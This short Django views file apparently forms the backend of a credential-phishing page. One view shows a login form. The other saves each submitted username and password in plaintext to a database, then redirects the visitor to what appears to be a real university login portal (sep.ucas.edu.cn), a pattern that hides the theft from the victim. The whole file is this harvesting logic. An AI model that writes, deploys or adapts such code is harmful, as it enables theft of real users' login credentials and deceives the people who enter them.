from django.shortcuts import render, redirect
from django.http import HttpResponse, request
from .models import Info
from .forms import InfoForm
# Create your views here.


def index(request):
    form = InfoForm()
    return render(request, 'login.html', context={'form': form})


def getinfo(request):
    if request.method == 'POST':
        form = InfoForm(request.POST)
        if form.is_valid():
            info = Info(username=form.cleaned_data['name'], pwd=form.cleaned_data['pwd'])
            info.save()
    return redirect("http://sep.ucas.edu.cn/")